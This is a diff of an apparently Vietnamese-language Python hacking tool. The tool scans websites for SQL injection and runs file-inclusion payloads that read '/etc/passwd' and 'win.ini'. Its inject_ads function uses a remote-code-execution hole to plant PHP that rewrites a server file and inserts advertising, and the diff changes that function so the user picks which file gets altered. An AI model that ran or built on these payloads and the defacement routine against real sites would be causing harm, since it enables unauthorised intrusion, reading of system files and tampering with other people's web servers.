@@ -126,7 +126,7 @@ def find_sqli(url):
                 pass
             print(Fore.YELLOW + url_ + Style.RESET_ALL)
             print("\n")
-            # Kiểm tra xem phản hồi có chứa chuỗi "abcxyz" hay không
+            # Kiem tra co dấu hiệu bị sqli không ( 500 or syntax sql)
             if response.status_code >= 500 or "You have an error in your SQL syntax" in response.text:
                     parsed_url = urllib.parse.urlparse(endpoint)
                     query_params = urllib.parse.parse_qs(parsed_url.query)
@@ -177,7 +177,7 @@ def find_sqli(url):
 
 
     print("Kiểm tra hoàn tất.")
-    # Xuất ra tất cả các lỗi xss tìm được
+    # Xuất ra tất cả các lỗi sqli tìm được
     print("-------------- Các lỗ hỏng SQL injection ------------")
     for vuln in vulns :
          print(Fore.RED + f"{vuln}\n" + Style.RESET_ALL)
@@ -254,9 +254,9 @@ def find_file_inclusion(url):
 # Chèn quảng cáo vào trang chủ index.php
 def inject_ads(url):
     print("Đang chèn quảng cáo qua lỗ hổng RCE...")
-
-    php_code ="""<?php
-    $file_path = 'index.php';
+    file = input('Tên file muốn chèn:')
+    php_code =f"""<?php
+    $file_path = '{file}';
 
     $content = file_get_contents($file_path);
 
@@ -287,12 +287,12 @@ def inject_ads(url):
 
     response = requests.get(new_url)
     if "Success!" in response.text:
-        print("Tệp index.php đã được thay đổi thành công!")
+        print("Tệp đã được thay đổi thành công!")
     else:
-        print("Tệp index.php thay đổi không thành công!!!")
+        print("Tệp thay đổi không thành công!!!")
 
 
-#Tạo payload để tìm SQL injection
+#Tạo payload để tìm LFI
 def generate_payload_test_File_inclusion(url_web):
 
     payload_file_inclusion = ["../../../../etc/passwd","/etc/passwd","C:/Windows/win.ini"]
@@ -324,7 +324,7 @@ def generate_payload_test_File_inclusion(url_web):
                         endpoints.append(new_url)
 
 
-
+#recon
 def recon_web(url):
     
 
